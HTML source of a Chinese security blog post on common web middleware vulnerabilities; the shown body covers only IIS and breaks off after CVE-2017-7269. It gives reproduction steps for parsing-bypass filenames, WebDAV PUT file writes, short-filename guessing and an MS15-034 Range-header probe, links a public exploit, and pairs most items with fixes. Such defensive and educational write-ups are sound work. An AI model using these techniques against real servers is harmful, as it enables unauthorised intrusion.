@@ -1,0 +1,1385 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico?v=5.1.3">
+
+
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Web中间件常见漏洞总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web中间件常见漏洞总结">
+<meta property="og:url" content="http://www.lxhsec.com/2019/03/04/middleware/index.html">
+<meta property="og:site_name" content="lyxhh">
+<meta property="og:description" content="Web中间件常见漏洞总结">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisparse1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisparse2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisparse3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iis6xiu01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisinstall1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisinstall2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisinstall3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisinstall4.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisinstall5.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisinstall6.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iis7-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iis7-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisput01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisput02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisshort01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisshort02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisshort03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisshort04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisshort05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisshort06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisshort07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisshort08.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iissys01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iissys02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7269-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7269-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7269-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7269-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7269-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7269-07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7269-08.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7269-10.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7269-11.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7269-09.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7269-06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/apachePaser1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/apachePaser2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/apachePaser4.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/apachePaser3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-15715-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-15715-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-15715-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/nginx1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/nginx3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/iis7-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/nginx2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/NginxNullbyte01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/NginxCVE-2013-4547-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/NginxCVE-2013-4547-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/nginxcrlf0.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/nginxcrlf2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/nginxcrlf1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/nginxdirthrough.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/nginxdirtraversal1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/nginxdirtraversal2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/nginxheader0.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/nginxheader1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/nginxheader2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/tomcatput1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/tomcatput2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/tomcatput3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-0232-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-0232-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-0232-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-0232-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/tomcatwar1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/tomcatwar2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/tomcatmanager1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/tomcatmanager2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/tomcatmanager3.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/tomcatmanager4.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/tomcatmanager5.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/jboss1.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/jboss2.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-121491.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-121492.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2015-7501-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2015-7501-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2013-4810-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2013-4810-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-121493.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-121494.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7504-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-7504-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/JbossAdminconsole01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/JbossAdminconsole02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/JbossAdminconsole03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/JbossAdminconsole04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/JbossAdminconsole05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/Jbossjmxconsole01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/Jbossjmxconsole02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/Jbossjmxconsole03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/Jbossjmxconsole05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/Jbossjmxconsole04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/Jbossjmxconsole06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/Jbossjmxconsole07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/weblogic01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/cve-2017-10271-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/cve-2017-10271-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/cve-2017-10271-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-2725-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-2725-06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-2725-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-2725-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-2725-08.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-2725-07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-2725-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-2725-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2019-2725-09.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2018-2628-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2018-2628-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2018-2628-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/weblogic02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/weblogic03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2018-2894-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2018-2894-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2018-2894-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2018-2894-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2018-2894-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2018-2894-06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2018-2894-08.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2018-2894-07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2014-4210-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2014-4210-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2014-4210-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2014-4210-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2014-4210-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2014-4210-06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/weblogic04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/weblogic05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/weblogic06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/weblogic07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/weblogic08.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/weblogic09.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/weblogic10.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/weblogic11.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/GlassFish01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2017-1000028-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/GlassFish05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/GlassFish02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/GlassFish03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/GlassFish04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2015-7450-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/CVE-2015-7450-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/WebSphere01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/WebSphere02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/WebSphere03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2019/03/04/middleware/WebSphere04.png">
+<meta property="og:updated_time" content="2019-06-29T12:42:59.182Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Web中间件常见漏洞总结">
+<meta name="twitter:description" content="Web中间件常见漏洞总结">
+<meta name="twitter:image" content="http://www.lxhsec.com/2019/03/04/middleware/iisparse1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lxhsec.com/2019/03/04/middleware/"/>
+
+
+
+
+
+  <title>Web中间件常见漏洞总结 | lyxhh</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lyxhh</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lxhsec.com/2019/03/04/middleware/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lyxhh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lyxhh">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Web中间件常见漏洞总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-04T20:57:41+08:00">
+                2019-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Web中间件常见漏洞总结<a id="more"></a></p>
+<h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><p>IIS是Internet Information Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。<br><strong>IIS目前只适用于Windows系统，不适用于其他操作系统。</strong></p>
+<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h3><p>基于文件名</p>
+<p>该版本 默认会将 *.asp;.jpg 此种格式的文件名，当成Asp解析，原理是 服务器默认不解析; 号及其后面的内容，相当于截断。<br><img src="/2019/03/04/middleware/iisparse1.png" alt="iisparse1"></p>
+<p>基于文件夹名</p>
+<p>该版本 默认会将 *.asp/目录下的所有文件当成Asp解析。<br><img src="/2019/03/04/middleware/iisparse2.png" alt="iisparse2"></p>
+<p>另外，IIS6.x除了会将扩展名为.asp的文件解析为asp之外，还默认会将扩展名为.asa，.cdx，.cer解析为asp，<br>从网站属性-&gt;主目录-&gt;配置 可以看出，他们都是调用了asp.dll进行的解析。<br><img src="/2019/03/04/middleware/iisparse3.png" alt="iisparse3"></p>
+<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>由于微软并不认为这是一个漏洞，也没有推出IIS 6.0的补丁，因此漏洞需要自己修复。</p>
+<ol>
+<li><p>限制上传目录执行权限，不允许执行脚本。<br><img src="/2019/03/04/middleware/iis6xiu01.png" alt="iis6xiu01"></p>
+</li>
+<li><p>不允许新建目录。</p>
+</li>
+<li>上传的文件需经过重命名(时间戳+随机数+.jpg等)</li>
+</ol>
+<h3 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h3><p>安装IIS7.5，<br>1.控制面板 -&gt; 程序 -&gt; 打开或关闭windows功能。<br><img src="/2019/03/04/middleware/iisinstall1.png" alt="iisinstall1"></p>
+<p>2.下载<a href="http://windows.php.net/downloads/releases/archives/" target="_blank" rel="external">php</a>-5.2.6-win32-installer.msi</p>
+<p>3.打开msi，一直下一步来到选择<code>web server setup</code>的界面，在这里选择<code>IIS fastcgi</code>,之后一直下一步。</p>
+<p>4.打开IIS，管理工具 -&gt;Internet 信息服务(IIS)管理器</p>
+<p>5.选择编辑ISAPI或者CGI限制<br><img src="/2019/03/04/middleware/iisinstall2.png" alt="iisinstall2"><br>添加安装的php-cgi.exe路径，描述随意。<br><img src="/2019/03/04/middleware/iisinstall3.png" alt="iisinstall3"></p>
+<p>6.返回第五步的第一个图片位置，点击处理程序映射，添加如下。<br><img src="/2019/03/04/middleware/iisinstall4.png" alt="iisinstall4"></p>
+<p>7.phpinfo测试<br><img src="/2019/03/04/middleware/iisinstall5.png" alt="iisinstall5"></p>
+<p>IIS7.x版本 在<code>Fast-CGI</code>运行模式下,在任意文件，例：test.jpg后面加上/.php，会将test.jpg 解析为php文件。<br><img src="/2019/03/04/middleware/iisinstall6.png" alt="iisinstall6"></p>
+<h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><p>配置cgi.fix_pathinfo(php.ini中)为0并重启php-cgi程序<br><img src="/2019/03/04/middleware/iis7-01.png" alt="iis7-01"></p>
+<p>结果如下：<br><img src="/2019/03/04/middleware/iis7-02.png" alt="iis7-02"></p>
+<h2 id="PUT任意文件写入"><a href="#PUT任意文件写入" class="headerlink" title="PUT任意文件写入"></a>PUT任意文件写入</h2><p>IIS Server 在 Web 服务扩展中开启了 WebDAV之后，支持多种请求，配合写入权限，可造成任意文件写入。<br><img src="/2019/03/04/middleware/iisput01.png" alt="iisput01"></p>
+<p><img src="/2019/03/04/middleware/iisput02.png" alt="iisput02"></p>
+<h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>关闭WebDAV 和 写权限</p>
+<h2 id="IIS短文件漏洞"><a href="#IIS短文件漏洞" class="headerlink" title="IIS短文件漏洞"></a>IIS短文件漏洞</h2><p>Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位 Windows的程序访问这些文件。在cmd下输入”dir /x”即可看到短文件名的效果。<br><img src="/2019/03/04/middleware/iisshort01.png" alt="iisshort01"></p>
+<p>IIS短文件名产生：</p>
+<blockquote>
+<p>1.当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。<br>2.当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。</p>
+</blockquote>
+<p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种。<br>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功。</p>
+<p>复现：</p>
+<p>IIS8.0以下版本需要开启ASP.NET支持，IIS大于等于8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。<br>以下通过开启IIS6.0 ASP.NET后进行复现。<br><img src="/2019/03/04/middleware/iisshort02.png" alt="iisshort02"></p>
+<p>当访问构造的某个存在的短文件名，会返回404；<br><img src="/2019/03/04/middleware/iisshort03.png" alt="iisshort03"></p>
+<p>当访问构造的某个不存在的短文件名，会返回400；<br><img src="/2019/03/04/middleware/iisshort04.png" alt="iisshort04"></p>
+<p>IIS短文件漏洞局限性<br>1) 如果文件名本身太短也是无法猜解的；<br>2) 此漏洞只能确定前6个字符，如果后面的字符太长、包含特殊字符，很难猜解；<br>3) 如果文件名前6位带空格，8.3格式的短文件名会补进，和真实文件名不匹配；<br>4) 如果文件夹名前6位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报；<br>5) 不支持中文文件名，包括中文文件和中文文件夹。一个中文相当于两个英文字符，故超过4个中文字会产生短文件名，但是IIS不支持中文猜测。<br><img src="/2019/03/04/middleware/iisshort05.png" alt="iisshort05"><br><img src="/2019/03/04/middleware/iisshort06.png" alt="iisshort06"></p>
+<p><a href="https://github.com/irsdl/IIS-ShortName-Scanner" target="_blank" rel="external">短文件利用工具下载</a></p>
+<h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>1）从CMD命令关闭NTFS 8.3文件格式的支持</p>
+<p>Windows Server 2003： (1代表关闭，0代表开启）<br>关闭该功能：<code>fsutil behavior set disable8dot3 1</code><br><img src="/2019/03/04/middleware/iisshort07.png" alt="iisshort07"></p>
+<p>Windows Server 2008 R2：</p>
+<blockquote>
+<p>查询是否开启短文件名功能：fsutil 8dot3name query<br>关闭该功能：fsutil 8dot3name set 1</p>
+</blockquote>
+<p>不同系统关闭命令稍有区别，该功能默认是开启的.</p>
+<p>2）或从修改注册表关闭NTFS 8.3文件格式的支持</p>
+<p>快捷键Win+R打开命令窗口，输入regedit打开注册表窗口</p>
+<p>找到路径：<br><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</code>，将其中的 <code>NtfsDisable8dot3NameCreation</code>这一项的值设为 1，1代表不创建短文件名格式<br><img src="/2019/03/04/middleware/iisshort08.png" alt="iisshort08"></p>
+<p>以上两种方式修改完成后，均需要重启系统生效。</p>
+<p>Note:此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除，需要重新复制才会消失。<br>例:将web文件夹的内容拷贝到另一个位置，如c:\www到c:\ww,然后删除原文件夹，再重命名c:\ww到c:\www。</p>
+<h2 id="HTTP-SYS远程代码执行-MS15-034"><a href="#HTTP-SYS远程代码执行-MS15-034" class="headerlink" title="HTTP.SYS远程代码执行 (MS15-034)"></a>HTTP.SYS远程代码执行 (MS15-034)</h2><p>影响范围：<br>Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1 和 Windows Server 2012 R2</p>
+<p>复现：</p>
+<p>在Windows7上 安装IIS7.5。<br>1.访问。<br><img src="/2019/03/04/middleware/iissys01.png" alt="iissys01"></p>
+<p>2.编辑请求头，增加<code>Range: bytes=0-18446744073709551615</code>字段，若返回码状态为<code>416 Requested Range Not Satisfiable</code>，则存在HTTP.SYS远程代码执行漏洞<br><img src="/2019/03/04/middleware/iissys02.png" alt="iissys02"></p>
+<p>漏洞有点鸡肋，配合其他漏洞使用还是可以用用的，具体使用可转至MSF中。</p>
+<h3 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h3><p>安装修复补丁（KB3042553）</p>
+<h2 id="RCE-CVE-2017-7269"><a href="#RCE-CVE-2017-7269" class="headerlink" title="RCE-CVE-2017-7269"></a>RCE-CVE-2017-7269</h2><p>Microsoft Windows Server 2003 R2中的Internet信息服务（IIS）6.0中的WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以”If：&lt;http：//“开头的长标头执行任意代码PROPFIND请求。</p>
+<p>影响范围：<br>在Windows 2003 R2（Microsoft(R) Windows(R) Server 2003, Enterprise Edition Service Pack 2）上使用IIS 6.0并开启WebDAV扩展。</p>
+<p>复现：<br>CVE作者给出的<a href="https://github.com/edwardz246003/IIS_exploit/blob/master/exploit.py" target="_blank" rel="external">exp</a> 计算机弹弹弹！！！<br>用python2 运行，结果如下。<br><img src="/2019/03/04/middleware/CVE-2017-7269-01.png" alt="CVE-2017-7269-01"><br>任务管理器开启了calc.exe进程，因为计算器是网络服务权限打开的，所以我们在桌面上看不见。</p>
